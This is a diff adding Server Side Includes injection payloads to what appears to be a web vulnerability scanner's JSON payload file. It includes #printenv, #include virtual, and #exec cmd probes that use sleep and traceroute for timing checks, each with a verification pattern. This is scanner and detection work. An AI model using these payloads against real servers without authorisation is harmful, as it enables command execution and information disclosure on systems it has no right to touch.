@@ -1,4 +1,61 @@
 {
     "description": "Server Side Includes (shtml)",
-    "payloads": []
+    "payloads": [
+        {
+            "payload": [
+                "<!--#config errmsg=\"[RANDOM_8]\" --><!--#[RANDOM_2] --><!--#config errmsg=\"[RANDOM_9]\" --><!--#[RANDOM_2] -->",
+                "<!--#config errmsg='[RANDOM_8]' --><!--#[RANDOM_2] --><!--#config errmsg='[RANDOM_9]' --><!--#[RANDOM_2] -->"
+            ],
+            "verify": [
+                "[RANDOM_8][RANDOM_9]"
+            ],
+            "type": "REGEX"
+        },
+        {
+            "payload": "<!--#printenv -->",
+            "verify": [
+                "(((HTTP_HOST=)|(HTTP_USER_AGENT=)|(HTTP_CONNECTION=)|(SCRIPT_FILENAME=)|(REQUEST_METHOD=)|(REQUEST_SCHEME=)|(REQUEST_URI=)).*){4,}"
+            ],
+            "type": "REGEX"
+        },
+        {
+            "payload": [
+                "<!--#include virtual=\"/index.html\" -->",
+                "<!--#include virtual='/index.html' -->"
+            ],
+            "verify": [
+                "(<!DOCTYPE .*>[\\S\\s]*){2}"
+            ],
+            "type": "REGEX"
+        },
+        {
+            "payload": ["<!--#exec cmd='sleep 2' -->", "<!--#exec cmd=\"sleep 2\" -->"],
+            "verify": [
+                "2"
+            ],
+            "type": "TIME",
+            "tags": ["unix", "linux"]
+        },
+        {
+            "payload": [
+                "<!--#exec cmd='traceroute -z 3 localhost' -->",
+                "<!--#exec cmd=\"traceroute -z 3 localhost\" -->"
+            ],
+            "verify": [
+                "2"
+            ],
+            "type": "TIME",
+            "tags": ["windows"]
+        },
+        {
+            "payload": [
+                "<!--#echo var=\"[RANDOM_1]\" --><!--#echo var=\"[RANDOM_2]\" --><!--#echo var=\"[RANDOM_3]\" --><!--#echo var=\"[RANDOM_4]\" --><!--#echo var=\"[RANDOM_5]\" -->",
+                "<!--#echo var='[RANDOM_1]' --><!--#echo var='[RANDOM_2]' --><!--#echo var='[RANDOM_3]' --><!--#echo var='[RANDOM_4]' --><!--#echo var='[RANDOM_5]' -->"
+            ],
+            "verify": [
+                 "(none)(none)(none)(none)(none)"
+            ],
+            "type": "REGEX"
+        }
+    ]
 }
